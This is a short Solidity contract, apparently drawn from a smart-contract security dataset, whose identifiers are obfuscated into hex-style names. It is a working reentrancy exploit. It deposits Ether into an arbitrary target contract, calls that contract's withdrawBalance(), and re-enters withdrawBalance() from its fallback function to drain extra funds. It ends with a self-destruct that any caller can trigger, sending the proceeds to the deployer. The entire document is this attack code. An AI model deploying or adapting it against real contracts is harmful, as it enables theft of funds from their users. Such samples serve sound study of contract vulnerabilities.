pragma solidity ^0.4.15;

contract VaultOperator {
    bool public _0x740c1a=false;
    address public _0xd3fcd7;
    address public _0xdfe6fe;

    function VaultOperator() public{
        if (block.timestamp > 0) { _0xdfe6fe = msg.sender; }
    }

    function _0x1cfae8(address _0xa8e0fb) public payable{
        _0xd3fcd7 = _0xa8e0fb ;

        require(_0xd3fcd7.call.value(msg.value)(bytes4(_0x45d473("addToBalance()"))));
    }

    function _0x974b49() public{
        _0x740c1a = true;


        require(_0xd3fcd7.call(bytes4(_0x45d473("withdrawBalance()"))));
    }

    function () public payable{

        if (_0x740c1a){
            _0x740c1a = false;
                require(_0xd3fcd7.call(bytes4(_0x45d473("withdrawBalance()"))));
        }
    }

    function _0x7f7cb6(){
        suicide(_0xdfe6fe);
    }

}